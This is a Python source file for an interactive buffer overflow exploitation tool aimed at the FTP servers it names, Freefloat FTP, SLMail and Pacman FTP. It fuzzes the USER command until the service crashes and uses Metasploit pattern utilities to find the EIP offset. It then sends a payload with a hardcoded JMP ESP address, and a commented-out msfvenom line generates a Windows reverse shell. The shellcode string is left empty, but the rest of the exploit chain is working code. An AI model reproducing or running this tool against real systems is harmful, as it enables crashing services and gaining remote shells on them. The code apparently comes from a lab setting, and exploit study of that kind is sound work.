try:
    from rsc.color import Color
    from rsc.config import Util as config
    import socket
    import os
    import sys
    import time
    import subprocess
    import getch
except ImportError as err:
    print("Error: ", str(err))
    sys.exit()

class Tools:
    BADCHAR = [ '\x00', '\x0a', '\x0d', '\x20', '\x40']
    APPS = ['Freefloat FTP', 'SLMail', 'Pacman FTP']

    @staticmethod
    def fuzzerBof(target, rport):
        # target = config.checkIP(target)
        # port = config.checkPort(port)

        # create an array of buffers of varying lengths
        buffer = ["A"]
        counter = 20

        while len(buffer) <= 30:
            buffer.append("A" * counter)
            counter += 100

        cont = -1
        # now we step through the buffers
        for string in buffer:
            print("Sending buffer length " + str(len(string)))
            try:
                cont += 1
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(target), int(rport)))
                s.recv(1024)
                s.settimeout(2.0)
                s.send(str.encode("USER " + string + "\r\n"))
                s.recv(1024)
                s.send(str.encode("PASS anonymous\r\n"))
                s.recv(1024)
                s.settimeout(None)
                s.send(str.encode("QUIT\r\n"))
                s.close()
            except ConnectionError as err:
                if err.errno == 104:
                    Color.pl("\n{Y}[{R}!{Y}] {W}Apparently the application has been crashed")
                    Color.pl("{RL}Error: "+str(err)+"{W}")
                    lenBof = int(len(buffer[cont]))+80
                    Color.pl("The magic number se need is: ~{G}" + str(lenBof) + "{W}")
                    return int(lenBof)
                elif (err.errno == 111) and (len(string) <= 20):
                    Color.pl("\n{Y}[{R}!{Y}] {W}Please, check if the application has been started.")
                    Color.pl("{RL}Error: "+str(err)+"{W}")
                    break
                else:
                    Color.pl("{RL}[{R}!!{RL}] Something appers wrong{W}")
                    Color.pl("{RL}Error: "+str(err)+"{W}")
                    sys.exit(2)
            except Exception as err:
                    Color.pl("{R}"+str(err)+"{W}")

    @staticmethod
    def backBoneExploit(target, rport, pattern, revIP, lport, step):
        if str(step) == '1':
            Color.pl("{BL}{RL}###{D}{G} Sending pattern code {BL}{RL}###{D}{W}")
            Color.pl("{?} {G}Pattern Length: {Y}"+ str(len(pattern))+"{W}")
        elif str(step) == '2':
            # create an array of buffers of varying lengths
            # buf = "A" * int(eip)  # Junk bytes
            # buf = str(pattern)
            # 7CB9746C
            # buf += "\x6c\x74\xb9\x7c" #-> Endereco do JmP ESP
            # 7c b7 9e 3f
            # buf += "\x3F\x9E\xB7\x7c"
            # buf += "\x90" * 16

            Color.pl("{RL}### {G}Sending content length{RL} ###{W}")
            pattern = 'A' * int(pattern)
            #Color.pl("Insert ESP address")
            #esp = str(input())
            pattern += "\x6c\x74\xb9\x7c"
            badchar = []

            for x in Tools.BADCHAR:
                badchar.append(ord(x))

            #cmd = '"msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -b "%s" exitfunc=thread -f python" % (str(revIP), str(lport), str(badchar))'

            shellcode = ''
            shellcode = shellcode.split("\n")

            for x in shellcode:
                str(x).replace("buf", "pattern")
                if not x == 'buf =  ""':
                    pattern += str(x)

            #pattern += shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connect = s.connect((str(target), int(rport)))
            s.recv(1024)
            s.send("USER ".encode() + str(pattern).encode() + "\r\n".encode())
            s.settimeout(2)
            s.recv(1024)
            s.send("PASS anonymous\r\n".encode())
            s.recv(1024)
            s.send("QUIT\r\n".encode())
            s.settimeout(None)
            s.close()
        except ConnectionError as err:
            if err.errno == 104:
                Color.pl("\n{Y}[{R}!{Y}] {W}Apparently the application has been crashed")
                Color.pl("{RL}Error: " + str(err) + "{W}")
            elif (err.errno == 111) and (len(str(pattern)) <= 20):
                Color.pl("\n{Y}[{R}!{Y}] {W}Please, check if the application has been started.")
                Color.pl("{RL}Error: " + str(err) + "{W}")
                sys.exit()
            else:
                Color.pl("{RL}[{R}!!{RL}] Something appers wrong{W}")
                Color.pl("{RL}Error: " + str(err) + "{W}")
                sys.exit(2)
        except Exception as err:
            Color.pl("{!}{RL}Error: {R}" + str(err) + "{W}")

        Color.pl("{*}{C}Proccess Done.")

    @staticmethod
    def assistantMode(target, rport, revIP, lport):
        pattern = ''
        Color.pl("\n{B}Assistant mode{Y} has been set.{W}")
        # Exibe as aplicações que podem ser exploradas pelo usuario
        choice = Tools.selectApps()
        while not choice.isnumeric():
            config.clearScr()
            Color.pl("\n{!} {R}Insert just a valid number!")
            choice = Tools.selectApps()
        else:
            if int(choice) <= len(Tools.APPS) and int(choice) > 0:
                config.clearScr()
                Color.pl("\n{G}Application set: {Y}%s {W}" % str(Tools.APPS[int(choice)-1]))
                Color.pl("{*}{B}Starting Overflow{W}")
                Color.pl("{+}{G}Step 1 - {Y}Fuzzing{W}")
                eip = Tools.fuzzerBof(target, rport)

                Color.pl("\n{G}Length of EIP val> {Y}" + str(eip) + "{W}")

                Color.pl("\n{BL}{C}###{D}{C} Remember to start application again {BL}###{D}{W}")
                Color.p("{!}{G}Press any key {C}If{G} you have start application again!")

                getch.getch()
                config.clearScr()

                Color.pl("\n{+}{G}Step 2 - {Y}Finding JMP ESP{W}")
                Color.pl("{G}Let's create a pattern to inject in application{W}")
                Color.pl("{G}and use it to find in ESP address field{W}")
                Color.pl("{G}the content we need to continue the {R}BoF{G} process.{W}\n")

                pattern = Tools.pattern_create(eip)
                Color.pl("\n{G}Length of pattern> {Y}" + str(len(pattern)) + "{W}\n")
                escolha = 'Y'
                Color.pl("{?} {C}Do you wanna see content in 'pattern' var? [{Y}Y/n{C}]{W}")
                escolha = str(ord(getch.getch()))#.upper()

                if str(escolha) == '10' or str(escolha).upper() == 'Y':
                    Color.pl("{G}Length of pattern> {Y}" + str(pattern) + "{W}")

                Color.pl("{!} {P}Press any key to inject it!{W}")
                getch.getch()
                config.clearScr()
                Tools.backBoneExploit(target, rport, pattern, '', '', 1)

                if 'Aa0Aa1Aa2' in pattern:
                    try:
                        Color.pl("\n{G}See at your debbuger what's the value of EIP address{W}")
                        Color.pl("{G}Has any value there? Application has been crashed? [{Y}Y/n{G}]{W}")
                        escolha = 'Y'
                        escolha = str(ord(getch.getch()))  # .upper()
                        if str(escolha) == '10' or str(escolha).upper() == 'Y':
                            escolha = 'Y'
                            #Color.pl("{G}Length of pattern> {Y}" + str(pattern) + "{W}")
                            Color.p("{G}Insert value of {Y}EIP Register{G} at Debbuger> {C}")
                            eip = str(input())
                            try:
                                if bool(int(eip, 16)):
                                    eip = Tools.pattern_offset(eip)
                                    # Color.pl("\n{G}Length of eip var> {Y}" + str(len(eip)) + "{W}")
                                    Color.pl("{G}Content of EIP var> {Y}" + str(eip) + "{W}")
                                    eip = str(eip).split('offset',1)[-1].strip()
                                    escolha == ''
                                    while str(escolha) != 10 or str(escolha).upper() != 'Y':
                                        Color.p("{!} {C}Have{G} you started application again? [{Y}Y/n{G}]{W}")
                                        escolha = str(ord(getch.getch()))  # .upper()

                                    if str(escolha) == '10' or str(escolha).upper() == 'Y':
                                        print("")
                                        Tools.backBoneExploit(target, rport, eip, revIP, lport, 2)

                            except Exception as err:
                                Color.pl("{!} {RL}Error: {R}" + str(err) + "{W}")
                                sys.exit()
                        else:
                            Color.pl("{RL} Follow my instructions careful !!! Try again.{W}")
                            Color.pl("{!} {R}Reload application on debbuger.{W}")
                            sys.exit()
                    except Exception as err:
                            Color.pl("{RL} Insert only hexadecimal value!{W}")
                            Color.pl("{G} Value: " + str(eip))
                            Color.pl("{R} Error: " + str(err))
                            sys.exit()
                else:
                    Color.pl("{GR}Value of pattern: " + str(pattern) + "{W}")
                    Color.pl("{GR}That isn't a valid pattern. Try again.")
                    sys.exit()
            else:
                Color.pl("{P}Invalid option, try again script kiddie.")
                sys.exit()

    @staticmethod
    def checkApps():
        c = 0
        for app in Tools.APPS:
            c += 1
            Color.pl("[{C}%s{W}] {R}%s{W}" % (str(c), str(app)))

    @staticmethod
    def selectApps():
        Color.pl("{G}Which Apps would you like to exploit with this tool?{W}")
        Tools.checkApps()
        Color.p("\n{G}Please, choose an app to start: {Y}")
        choice = input("")
        Color.p("{W}")
        return choice

    @staticmethod
    def pattern_create(bof):
        Color.p("{G}Generating pattern to overflow application{W}")
        for i in range(3):
            Color.p("{BL}{G}.{D}{W}")
            time.sleep(1)
        try:
            pattern = os.popen("msf-pattern_create -l %s" % str(bof)).read()
            return pattern
        except OSError as err:
            Color.pl("{R}----- An error occurs -----")
            Color.pl("{RL}"+str(err)+"{W}")

    @staticmethod
    def pattern_offset(eip):
        if len(eip) == 8:
            try:
                resposta = os.popen("msf-pattern_offset -q %s" % str(eip)).read()
                if resposta:
                    return resposta
                else:
                    config.clearScr()
                    Color.pl("{!}{RL}Content of patern_offset empty. {Y}Check If{RL} application is running{W}")
                    sys.exit()
            except OSError as err:
                Color.pl("{R}----- An error occurs -----")
                Color.pl("{RL}" + str(err) + "{W}")
        else:
            Color.pl("{G}Your input in {Y}-e{G} param is equal to: {G}"+str(eip)+"{G}. Is is rigth?{W}")
            Color.pl("{G}Remember that usually the content of the EIP address have 8 chars in hexadecimal{W}")
            Color.pl("{G}So, check on debbuger what's the value on this field.{W}")
            sys.exit()

# Tools.assistantMode('192.168.56.107', 21)
# Tools.backBoneExploit('192.168.56.107', '21', '230','192.168.56.1', '4441', '2')